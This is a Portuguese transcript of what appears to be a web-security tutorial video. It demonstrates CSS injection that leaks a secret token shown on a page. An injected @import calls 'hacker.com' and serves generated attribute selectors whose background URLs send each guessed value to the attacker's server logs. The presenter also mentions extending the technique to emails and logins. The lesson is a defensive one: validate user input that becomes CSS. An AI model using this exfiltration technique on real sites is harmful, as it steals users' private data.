WEBVTT Muito bem, vamos continuar aqui na nossa jornada pra convencer você a nunca mais confiar no código que é executado no cliente, HTML, Javascript, nem no CSS. Esse é o exemplo que eu vou mostrar agora. Como é que você, permitindo a injeção de CSS na página, está abrindo brechas de segurança. Injetar CSS é um negócio bastante comum. É comum, por exemplo, que tem aplicações em que, já vi isso, uma caixa lá, digite aqui o CSS que você quer que seja incluído no header das páginas. E a pessoa coloca ali a folha de estilo que ela quiser. Ou mesmo uma coisa mais simples, uma aplicação em que você escolhe um tema e o nome desse tema é usado num arroba em porc, mas o valor não foi validado, então o cara podia passar outra coisa ali, sabe? URL externa, ao invés do nome do tema ou qualquer coisa assim. Ou mesmo algo assim como, ah, tem um campo de color, input type color, para você escolher a cor de uma determinada área, mas o valor que esse campo envia não é validado no servidor. Então, lembra, o client é o território do hacker, ele vai lá no console do Chrome e troca o type color desse input por um type text, põe o que ele quiser ali, troca por uma textária, sabe, coloca ali um código CSS inteiro e envia, e aí lá no servidor isso dá bypass na validação. Então vamos lá, deixa eu mostrar código para vocês aqui para você entender o risco, o perigo disso, beleza? Eu criei uma pasta aqui chamada CSS Sniffing, vou criar um arquivo index aqui e vou usar o Pluma. Conhece o Pluma? O Pluma é um editor bem pobrezinho, mas é leve, é rápido. Cada vídeo um editor diferente aqui, hein? Não, não é tanto assim, tem uns que eu repito bastante. Então, imagina você fazendo uma página que vai mostrar um token secreto para o usuário, alguma coisa que só ele pode ver, sabe? É o token de API dele, por exemplo, alguma coisa assim. Então, aqui eu vou colocar um negócio curto para a gente perder pouco tempo. Então, eu vou colocar um número de quatro dígitos super secreto, esse aqui, beleza? E aí você também tem ali um pouquinho de CSS, né? Vamos formatar esse input, por exemplo. Fazer... Pre-blocking... 125 pixels... font-size 48... margin... 1px alto... E vamos abrir isso aqui, ver como ficou. Vou abrir um live server. Faltou alinhar o texto. Muito bem, tá lá. Então essa é a minha página que mostra um token secreto, esse token vem do servidor ali e tal. No caso o meu token aqui é 1, 2, 3, 4. Ele podia ser qualquer coisa. E aí você permitiu que o usuário colocasse no cabeçalho dessa página o CSS que ele quisesse ali. Ou permitiu que ele editasse alguma coisa e ele conseguiu injetar a CSS ali. E aí ele foi lá e colocou algo como assim, arroba em porc, http://hacker.com/.inject.php Vou fazer desse jeito. E aí esse arquivo .inject.php eu vou, agora eu sou o hacker né, então eu vou editar com o VI. Vou abrir o console do Chrome aqui para a gente ver o que está acontecendo na aba Network. e olha lá ele chamou o meu arquivo inject.php primeira coisa que eu vou fazer aqui eu vou gerar um php dinamicamente então eu preciso mandar um content-type aqui né não é text-html é text-css e aí em seguida vamos fazer igual a zero e menor 10.000 e mais mais fazer um forzinho aqui e ai vamos fazer echo input cujo value é igual a e vai ter como background uma URL Dólar e PNG. Aqui, isso é suficiente? Vamos ver. Tá lá, deu certo, olha só. Então, ele tentou ler agora uma URL. 1, 2, 3, 4, PNG. Uma URL que não existe, deu erro aqui, então não. Não alterou o layout da página. O usuário continua usando a página lá sem desconfiar de nada. Mas o hacker, lá nos logs do servidor, Vamos ver esse barra aqui pra onde tá indo... hacker.com barra... 2, 3, 4... Então lá nos logs do servidor aparece cada vez que ele carrega a página, aqui ó, qual que é a senha, vou trocar a senha, vou... outro token agora... 3, 4, 9, 8... vamos recarregar a página... o usuário não tá sabendo de nada pra ele, só deu uma piscadinha, ele carregou e tudo mais, ele pegou o token que ele tem que usar e tal, mas o hacker, lá no servidor hacker, recebeu o código do token, tá ali ó, legal? Esse ataque pode ficar mais sofisticado, usando as expressões de query de atributo do CSS, tá? Então aqui eu poderia usar coisas como value Começa com 0, começa com 01, termina com 01 e assim por diante. Poderia tratar isso dessa maneira, mas não vem ao caso ficar melhorando esse código. Eu só queria demonstrar para você o perigo que é você permitir que o seu usuário injete CSS. Porque a gente geralmente se preocupa com HTML, vai se preocupar com JavaScript, mas CSS, né? então aqui eu não executei nada exatamente ali, não tive nenhum comportamento malicioso lá na máquina do usuário, não consegui executar código arbitrariamente, mas eu tive um problema de privacidade, vazamento de informação, porque o CCS está me dizendo ali, olha só, esse aqui é o token desse usuário, do mesmo jeito que eu escrevi um script com um for simples ali, né, usando só números, mas eu podia escrever um script com uma análise combinatória para ler números e letras, para, por exemplo, ler qual que é o login desse usuário, qual que é o e-mail dele, né, ou que outra informação tiver na tela ali que for possível usar num filtro de CSS. Lembrando que o CSS não tem filtro apenas de atributo, mas tem filtro de conteúdo também. Ou seja, vai permitir que qualquer tipo de entrada do usuário que vai virar CSS, essa entrada tem que ser validada. O mesmo tipo de cuidado que você tem com HTML e com JavaScript, tem que ter com CSS também. Valeu!